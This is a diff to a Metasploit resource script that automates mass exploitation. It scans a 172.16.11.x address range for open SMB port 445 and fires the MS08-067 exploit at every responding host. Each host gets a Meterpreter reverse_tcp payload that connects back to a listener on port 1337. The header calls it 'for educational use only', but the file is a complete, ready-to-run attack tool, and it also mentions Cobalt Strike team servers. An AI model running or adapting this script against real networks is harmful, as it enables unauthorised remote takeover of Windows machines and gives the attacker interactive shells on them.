@@ -1,23 +1,28 @@
+#################################################
 # Resource file for metasploit
+# by @jgaudard
 # Auto exploits using ms08_067 and metrepreter
-# Used db_nmap to check port 445
-# Sets msfhandler
-# Version 0.1
+# For educational use only
+# Version 1.0
+#################################################
  
  
  
 <ruby>
  
 # Setting up variables
+# With some slight modifications, you can use different exploits like MS03_026
 lhost = "172.16.11.11"
 lport = "1337"
-exploit = "exploit/multi/handler"
+handler = "exploit/multi/handler"
+exploit = "exploit/windows/smb/ms08_067_netapi"
 payload = "windows/meterpreter/reverse_tcp"
-targets = "172.16.11.0/24"
+targets = "172.16.11.2-13"
 port = "445"
  
 # Starting Mulit-Handler
-run_single("use #{exploit}")
+# You probably don't need this if you are going to connect to a cobalt strike team server
+run_single("use #{handler}")
 run_single("set PAYLOAD #{payload}")
 run_single("set LHOST #{lhost}")
 run_single("set LPORT #{lport}")
@@ -31,5 +36,22 @@ run_single("workspace autopwn")  #probably redundant
  
 # Runs NMAP
 run_single("db_nmap -p #{port} #{targets}")
+ 
+# Let there be magic!
+framework.db.hosts.each do |host|
+        host.services.each do |service|
+                if service.name == "microsoft-ds" and service.state == "open"
+                        print_line("exploiting #{host.address}")
+                        run_single("use #{exploit}")
+                        run_single("set RHOST #{host.address}")
+                        run_single("set PAYLOAD #{payload}")
+                        run_single("set LHOST #{lhost}")
+                        run_single("set LPORT #{lport}")
+                        run_single("set DisablePayloadHandler true")
+                        run_single("exploit -j")
+                        run_single("back")
+                end
+        end
+end
  
 </ruby>
